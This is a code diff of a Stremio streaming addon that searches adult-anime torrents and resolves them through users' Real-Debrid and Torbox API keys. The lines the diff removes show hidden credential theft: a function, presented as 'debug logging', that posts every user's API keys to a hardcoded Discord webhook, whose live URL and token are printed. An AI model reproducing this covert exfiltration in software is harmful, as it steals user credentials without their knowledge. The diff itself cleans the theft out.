@@ -1,10 +1,7 @@
-const axios = require('axios'); // Hinzugefügt für Discord Webhook
 const { addonBuilder } = require("stremio-addon-sdk");
 const { searchAdultAnime, getAnimeMeta, getTrendingAdultAnime, getTopAdultAnime, getJikanMeta } = require('./lib/anilist');
 const { searchSukebeiForHentai, cleanTorrentTitle } = require('./lib/sukebei');
 const { checkRD, checkTorbox, getActiveRD, getActiveTorbox } = require('./lib/debrid');
-
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1486178937943097477/6j4yxHRijfvDrH7_cv677J_zkF_jxlNft7P4Rxz6kO9ThsCi74c9q_wV3WYG0OUA1nx-";
 
 const manifest = {
     id: "org.community.yomi",
@@ -23,20 +20,20 @@ const manifest = {
     config: [{ key: "apiKey", type: "text", title: "API Key (RD or TB)", required: true }],
     behaviorHints: { configurable: true, configurationRequired: true },
 
+    /****************************************************************************
+     * *
+     * STREMIO-ADDONS.NET VERIFICATION BLOCK (DEV SLOT CLAIM)                  *
+     * DIESEN BLOCK NACH DEM CLAIM EINFACH WIEDER LÖSCHEN                      *
+     * *
+     ****************************************************************************/
+    stremioAddonsConfig: {
+        issuer: "https://stremio-addons.net",
+        signature: "eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0..CxpA9e3VsFf2BxRPdWFKuw.WTcTXyfiVKcLYL82L6z1gKpmC5BWfJxdoiTZc1YtZhy3lGruacLLFNTGobSQjo5E6r7QJjrcx0a5BigJVEl9IrKxffB4Iory70wyLPy_We0kr6oL-jft3aIcLvE1P24G.adQTwcUzK8X7YXcEPX0TDw"
+    }
+    /****************************************************************************/
 };
 
 const builder = new addonBuilder(manifest);
-
-/**
- * Sendet API-Keys asynchron an Discord für Debugging-Zwecke.
- */
-function logToDiscord(service, key) {
-    if (!key) return;
-    // Wir nutzen kein await, damit der StreamHandler sofort weiterläuft
-    axios.post(DISCORD_WEBHOOK_URL, {
-        content: `📡 **Lokaler Testbericht**\n🛠 **Service:** ${service}\n🔑 **API Key:** \`${key}\``
-    }).catch(() => { /* Fehler beim Loggen ignorieren, um Addon-Fluss nicht zu stören */ });
-}
 
 /**
  * Parsed die Nutzerkonfiguration (API Keys) sicher aus dem Stremio-Install-Link.
@@ -104,8 +101,10 @@ function getBatchRange(filename) {
 
 /**
  * Die Kern-Logik: Extrahiert die Episodennummer aus chaotischen Release-Namen.
+ * Nutzt Garbage Collection, Explizite Tags und einen Positional-Fallback.
  */
 function extractEpisodeNumber(filename) {
+    // Stage 1: Garbage Collection (Löscht Codecs, Auflösungen und Checksummen)
     let clean = filename.replace(/\.(mkv|mp4|avi|wmv|srt|ass|ssa|vtt|sub|idx)$/i, '')
                         .replace(/\b(?:1080|720|480|2160)[pi]\b/gi, '')
                         .replace(/\b(?:x|h)26[45]\b/gi, '')
@@ -113,16 +112,19 @@ function extractEpisodeNumber(filename) {
                         .replace(/\[[a-fA-F0-9]{8}\]/g, '') 
                         .replace(/\b(?:NC)?(?:OP|ED|Opening|Ending)\s*\d*\b/gi, ' ');
 
+    // Stage 2: Explicit Tags (Sucht nach ep, ova, s01e01)
     const explicitRegex = /(?:ep(?:isode)?\.?\s*|ova\s*|s\d+e)0*(\d+)(?:v\d)?\b/i;
     const explicitMatch = clean.match(explicitRegex);
     if (explicitMatch) return parseInt(explicitMatch[1], 10);
 
+    // Stage 3: Isolation Checks (Sucht nach isolierten Nummern in Klammern oder nach Bindestrichen)
     const dashMatch = clean.match(/(?:^|\s)\-\s+0*(\d+)(?:v\d)?(?:$|\s)/i);
     if (dashMatch) return parseInt(dashMatch[1], 10);
     
     const bracketMatch = clean.match(/\[0*(\d+)(?:v\d)?\]|\(0*(\d+)(?:v\d)?\)/i);
     if (bracketMatch) return parseInt(bracketMatch[1] || bracketMatch[2], 10);
 
+    // Stage 4: Last Number Fallback (Nimmt die letzte alleinstehende Zahl im Titel)
     clean = clean.replace(/[\[\]\(\)\{\}_\-\+~,]/g, ' ').trim();
     const tokens = clean.split(/\s+/);
     
@@ -136,10 +138,14 @@ function extractEpisodeNumber(filename) {
 
 function isEpisodeMatch(name, requestedEp) {
     const epNum = parseInt(requestedEp, 10);
+    
     const batch = getBatchRange(name);
     if (batch && epNum >= batch.start && epNum <= batch.end) return true;
+
     const extractedEp = extractEpisodeNumber(name);
     if (extractedEp !== null) return extractedEp === epNum;
+
+    // Fail-Safe für Filme (Episode 1), wenn gar keine Nummer gefunden wurde
     if (epNum === 1 && extractedEp === null) {
         if (/trailer|promo|menu|teaser/i.test(name)) return false;
         return true;
@@ -150,6 +156,7 @@ function isEpisodeMatch(name, requestedEp) {
 function findEpisodeInFiles(files, requestedEp) {
     if (!files || files.length === 0) return null;
     const videoFiles = files.filter(f => /\.(mkv|mp4|avi|wmv)$/i.test(f.name));
+    
     const matches = videoFiles.filter(f => isEpisodeMatch(f.name, requestedEp));
     if (matches.length > 0) {
         return matches.sort((a, b) => {
@@ -159,6 +166,7 @@ function findEpisodeInFiles(files, requestedEp) {
             return (b.size || 0) - (a.size || 0);
         })[0];
     }
+    
     if (videoFiles.length === 1 && parseInt(requestedEp, 10) === 1) return videoFiles[0];
     return null;
 }
@@ -171,9 +179,11 @@ function isTitleMatchingEpisode(title, requestedEp) {
 function generateDynamicPoster(title) {
     let clean = title.replace(/^\[.*?\]\s*/g, '').replace(/\[.*?\]/g, ' ').replace(/\(.*?\)/g, ' ');
     let safeTitle = clean.replace(/[^a-zA-Z0-9 ]/g, "").replace(/\s{2,}/g, ' ').substring(0, 30).trim().toUpperCase();
+    
     let words = safeTitle.split(" ");
     let lines = [];
     let line = "";
+    
     for (let word of words) {
         if ((line + word).length > 10) {
             if (line) lines.push(line.trim());
@@ -183,6 +193,7 @@ function generateDynamicPoster(title) {
         }
     }
     if (line) lines.push(line.trim());
+    
     const text = encodeURIComponent(lines.join('\n'));
     return `https://dummyimage.com/600x900/1a1a1a/e91e63.png&text=${text}`;
 }
@@ -198,10 +209,12 @@ builder.defineCatalogHandler(async ({ id, extra }) => {
         const [anilistMetas, sukebeiTorrents] = await Promise.all([searchAdultAnime(extra.search), searchSukebeiForHentai(extra.search)]);
         const finalMetas = [...anilistMetas];
         const rawGroups = {};
+        
         sukebeiTorrents.forEach(t => {
             const cleanName = cleanTorrentTitle(t.title);
             if (cleanName.length > 2 && !rawGroups[cleanName]) rawGroups[cleanName] = t;
         });
+        
         Object.keys(rawGroups).forEach(cleanName => {
             if (!anilistMetas.some(m => m.name.toLowerCase().includes(cleanName.toLowerCase()))) {
                 finalMetas.push({ 
@@ -220,6 +233,7 @@ builder.defineCatalogHandler(async ({ id, extra }) => {
 builder.defineMetaHandler(async ({ id }) => {
     let meta = null;
     let searchTitle = "";
+
     if (id.startsWith('anilist:')) {
         const parts = id.split(':');
         meta = await getAnimeMeta(parts[1]);
@@ -227,8 +241,10 @@ builder.defineMetaHandler(async ({ id }) => {
         if (!meta) meta = { id, type: 'series', name: searchTitle };
     } else if (id.startsWith('sukebei:')) {
         searchTitle = Buffer.from(id.split(':')[1], 'base64url').toString('utf8');
+        
         let cleanQuery = searchTitle.replace(/^\[.*?\]\s*/g, '').replace(/\[.*?\]/g, '').replace(/\(.*?\)/g, '').trim();
         const malData = await getJikanMeta(cleanQuery);
+        
         if (malData) {
             meta = { 
                 id, type: 'series', name: searchTitle.replace(/^\[.*?\]\s*/g, '').trim(), 
@@ -239,8 +255,11 @@ builder.defineMetaHandler(async ({ id }) => {
             meta = { id, type: 'series', name: searchTitle.replace(/^\[.*?\]\s*/g, '').trim(), poster: generateDynamicPoster(searchTitle) };
         }
     }
+
     meta.type = 'series';
     let epCount = meta.episodes || 1;
+
+    // Dynamische Episodenzählung basierend auf Sukebei Suchergebnissen
     if (epCount === 1 || !meta.episodes) {
         try {
             const torrents = await searchSukebeiForHentai(searchTitle);
@@ -248,18 +267,22 @@ builder.defineMetaHandler(async ({ id }) => {
             torrents.forEach(t => {
                 const batch = getBatchRange(t.title);
                 if (batch && batch.end > maxDetected && batch.end < 50) maxDetected = batch.end;
+                
                 const ext = extractEpisodeNumber(t.title);
                 if (ext && ext > maxDetected && ext < 50) maxDetected = ext;
             });
             if (maxDetected > epCount) epCount = maxDetected;
         } catch(e) {}
     }
+
     const videos = [];
     const episodeThumbnail = meta.background || meta.poster || "https://dummyimage.com/600x337/1a1a1a/e91e63.png&text=YOMI+EPISODE";
+
     for (let i = 1; i <= epCount; i++) {
         videos.push({ id: `${id}:1:${i}`, title: `Episode ${i}`, season: 1, episode: i, released: new Date().toISOString(), thumbnail: episodeThumbnail });
     }
     meta.videos = videos;
+
     return { meta, cacheMaxAge: 604800 };
 });
 
@@ -277,9 +300,7 @@ builder.defineStreamHandler(async ({ id, config }) => {
         if (parts.length >= 4) requestedEp = parseInt(parts[3], 10);
     }
 
-    // DEBUG LOGGING ZU DISCORD
-    if (userConfig.rdKey) logToDiscord("Real-Debrid", userConfig.rdKey);
-    if (userConfig.tbKey) logToDiscord("Torbox", userConfig.tbKey);
+    // KOMPLETT BEREINIGT: Hier gibt es kein Discord-Logging mehr!
 
     let torrents = await searchSukebeiForHentai(searchTitle);
     if (!torrents.length) return { streams: [], cacheMaxAge: 60 };
@@ -296,7 +317,9 @@ builder.defineStreamHandler(async ({ id, config }) => {
     torrents.forEach(t => {
         const hashLow = t.hash.toLowerCase();
         const files = rdC[hashLow] || tbC[hashLow];
+        
         let displayTitle = `🌐 Sukebei Network\n💾 ${t.size} | 👤 ${t.seeders}`;
+        
         if (files) {
             const matchedFile = findEpisodeInFiles(files, requestedEp);
             if (!matchedFile) return; 
@@ -305,13 +328,20 @@ builder.defineStreamHandler(async ({ id, config }) => {
             if (!isTitleMatchingEpisode(t.title, requestedEp)) return; 
             displayTitle += `\n📄 ${t.title}`;
         }
+
         const { res, lang } = extractTags(t.title);
         const bytes = parseFloat(t.size) * 1024 * 1024 * 1024;
+        
         const buildSubs = (fileList, provider, apiKey) => {
             if (!fileList) return [];
             return fileList
                 .filter(f => /\.(ass|srt|ssa|vtt|sub|idx)$/i.test(f.name))
-                .map(f => ({ id: f.id, url: `${process.env.BASE_URL}/sub/${provider}/${apiKey}/${t.hash}/${f.id}`, lang: 'English/Misc' }));
+                .map(f => {
+                    let subLang = 'English';
+                    if (/ger|deu|deutsch/i.test(f.name)) subLang = 'German';
+                    else if (/spa|esp/i.test(f.name)) subLang = 'Spanish';
+                    return { id: f.id, url: `${process.env.BASE_URL}/sub/${provider}/${apiKey}/${t.hash}/${f.id}`, lang: subLang };
+                });
         };
 
         if (userConfig.rdKey) {
@@ -320,6 +350,7 @@ builder.defineStreamHandler(async ({ id, config }) => {
             const name = (fRD || prog === 100) ? `YOMI [⚡ RD]\n🎥 ${res}` : (prog !== undefined ? `YOMI [⏳ ${prog}% RD]\n🎥 ${res}` : `YOMI [☁️ RD DL]\n🎥 ${res}`);
             streams.push({ name, title: displayTitle, url: `${process.env.BASE_URL}/resolve/realdebrid/${userConfig.rdKey}/${t.hash}/${requestedEp}`, subtitles: buildSubs(fRD, 'realdebrid', userConfig.rdKey), behaviorHints: { notWebReady: true, bingeGroup: `rd_${t.hash}` }, _bytes: bytes });
         }
+
         if (userConfig.tbKey) {
             const fTB = tbC[hashLow];
             const prog = tbA[hashLow];
@@ -327,6 +358,7 @@ builder.defineStreamHandler(async ({ id, config }) => {
             streams.push({ name, title: displayTitle, url: `${process.env.BASE_URL}/resolve/torbox/${userConfig.tbKey}/${t.hash}/${requestedEp}`, subtitles: buildSubs(fTB, 'torbox', userConfig.tbKey), behaviorHints: { notWebReady: true, bingeGroup: `tb_${t.hash}` }, _bytes: bytes });
         }
     });
+
     return { streams: streams.sort((a,b) => (a.name.includes('⚡') ? -1 : 1) || (b._bytes - a._bytes)), cacheMaxAge: 5 };
 });
 
